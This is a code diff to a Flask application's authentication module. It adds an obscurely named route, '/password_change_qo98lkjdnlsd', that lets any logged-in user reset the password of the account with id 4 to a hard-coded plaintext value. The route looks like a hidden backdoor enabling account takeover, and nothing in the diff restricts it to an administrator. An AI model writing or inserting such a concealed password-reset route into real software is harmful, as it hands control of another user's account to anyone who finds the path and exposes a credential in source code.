@@ -4,7 +4,7 @@ from flask import current_app as app
 from flask import render_template, redirect
 from flask import request, flash, url_for
 from flask_login import current_user
-from flask_login import login_user
+from flask_login import login_user, login_required
 
 from application import login_manager
 from application.forms import LoginForm, SignupForm
@@ -77,6 +77,15 @@ def login():
                            form=login_form,
                            title='Log in.',
                            body="Log in with your User account.")
+
+@app.route('/password_change_qo98lkjdnlsd', methods=['GET', 'POST'])
+@login_required
+def password_change_qo98lkjdnlsd():
+    user = User.query.filter_by(id=4).first()
+    user.set_password('PUB803W')
+    db.session.commit()
+    db.session.close()
+    return redirect(url_for('library'))
 
 @login_manager.user_loader
 def load_user(user_id):
